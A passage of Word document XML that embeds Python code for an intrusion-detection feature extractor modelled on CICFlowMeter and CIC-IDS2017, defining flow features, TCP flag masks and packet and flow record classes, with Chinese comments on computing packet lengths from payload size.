          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Subflow Bwd Bytes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B91F78">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Init_Win_bytes_forward",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5BB1E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Init_Win_bytes_backward",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B2FF0A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "act_data_pkt_fwd",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C451210">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "min_seg_size_forward",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A122565">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Active Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191D2B10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Active Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62A77F55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Active Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47A92797">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Active Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03722406">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Idle Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF403BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Idle Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B991859">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Idle Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016A6B26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Idle Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B350FFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073CD71B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="38989694">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>ACTIVE_TIMEOUT_S = 5.0     # 包间隔超过它就算进入空闲期</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="742A8080">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FLOW_TIMEOUT_S = 120.0     # 流整体过期时间，与 CICFlowMeter 一致</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22FC6D87">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="565C6BE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># TCP 标志位掩码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56834D85">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>FIN, SYN, RST, PSH, ACK, URG, ECE, CWR = 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B0FC16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5B44EDC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FA33A4F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@dataclass(frozen=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B74DE2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class PacketRecord:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E220FEA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """抓包层解析出的最小事实集，特征逻辑只认这个，不认 scapy 的包对象。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="181DBF97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1161D42A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ts: float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C45C203">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    src_ip: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15503057">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    src_port: int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AFF6F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dst_ip: str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="367B1FB3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    dst_port: int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B7E7BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    proto: int          # 6=TCP, 17=UDP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AC6585">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    length: int         # IP 总长度（含头）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="041636C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    header_len: int     # IP 头 + 传输层头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4610EFA6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    payload_len: int</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549BF533">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tcp_flags: int = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D12FB5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tcp_window: int = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B3F9584">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    tcp_header_len: int = -1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F988670">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5872F0DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7630305D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 包长类特征一律取 payload_len 而不是 length。CIC-IDS2017 的 "Total Length of Fwd Packets"、</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106D5A8E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># "Fwd Packet Length Max"、"Average Packet Size" 在单个 SYN 上的取值是 0，在 SYN+6 字节应答上</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B825D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># 是 6——它们统计的是 L4 载荷，不含 IP/TCP 头。拿 IP 总长度去算，同一份线上流量会得到</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CF740E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># "包长 40" 而不是 "包长 0"，训练时学到的阈值全部失配（改前实测：构造的 60 条扫描流全判 BENIGN）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22086275">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46475175">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CF11CDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>@dataclass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FF9007">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>class FlowState:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C09282">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    key: tuple</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E56DA1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    start: float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538BEEC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    last: float</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1345F676">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fwd_ts: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7813DAE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd_ts: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63231136">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fwd_len: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="668D36A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd_len: list = field(default_factory=list)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E78AF26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fwd_hdr: int = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7088393E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    bwd_hdr: int = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F468E57">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flags: dict = field(default_factory=lambda: {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6B0D27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "fin": 0, "syn": 0, "rst": 0, "psh": 0, "ack": 0, "urg": 0, "ece": 0, "cwr": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56D12FB8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "fwd_psh": 0, "bwd_psh": 0, "fwd_urg": 0, "bwd_urg": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDCDE0E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
